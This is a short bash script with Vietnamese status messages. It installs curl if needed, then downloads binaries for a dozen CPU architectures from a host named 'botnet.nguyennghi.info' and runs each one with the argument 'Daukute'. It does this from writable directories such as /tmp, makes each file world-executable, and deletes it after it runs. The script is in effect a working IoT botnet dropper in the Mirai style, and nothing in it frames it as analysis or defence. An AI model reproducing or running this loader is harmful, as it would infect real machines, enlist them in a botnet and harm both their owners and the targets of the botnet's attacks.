#!/bin/bash

# Function to check if curl is installed
check_curl_installed() {
    if command -v curl &>/dev/null; then
        return 0
    else
        return 1
    fi
}

# Function to install curl if it's not already installed
install_curl_if_needed() {
    if ! check_curl_installed; then
        echo "Curl chưa được cài đặt. Đang cài đặt..."
        if [[ -f /etc/redhat-release ]]; then
            sudo yum install -y curl
        elif [[ -f /etc/lsb-release || -f /etc/os-release ]]; then
            sudo apt-get update
            sudo apt-get install -y curl
        else
            echo "Bản phân phối Linux không được hỗ trợ. Vui lòng cài đặt curl thủ công."
            exit 1
        fi
    fi
}

# Function to run the provided commands
run_commands() {
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/arm && chmod 777 arm && ./arm Daukute && rm -rf arm
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/arm5 && chmod 777 arm5 && ./arm5 Daukute && rm -rf arm5
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/arm6 && chmod 777 arm6 && ./arm6 Daukute && rm -rf arm6
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/arm7 && chmod 777 arm7 && ./arm7 Daukute && rm -rf arm7
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/m68k && chmod 777 m68k && ./m68k Daukute && rm -rf m68k
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/mips && chmod 777 mips && ./mips Daukute && rm -rf mips
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/mpsl && chmod 777 mpsl && ./mpsl Daukute && rm -rf mpsl
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/ppc && chmod 777 ppc && ./ppc Daukute && rm -rf ppc
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/sh4 && chmod 777 sh4 && ./sh4 Daukute && rm -rf sh4
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/spc && chmod 777 spc && ./spc Daukute && rm -rf spc
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/x86 && chmod 777 x86 && ./x86 Daukute && rm -rf x86
    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL http://botnet.nguyennghi.info/x86_64 && chmod 777 x86_64 && ./x86_64 Daukute && rm -rf x86_64
}

# Main execution
if check_curl_installed; then
    echo "Curl đã được cài đặt."
    run_commands
else
    echo "Curl chưa được cài đặt. Đang cài đặt..."
    install_curl_if_needed
    run_commands
fi
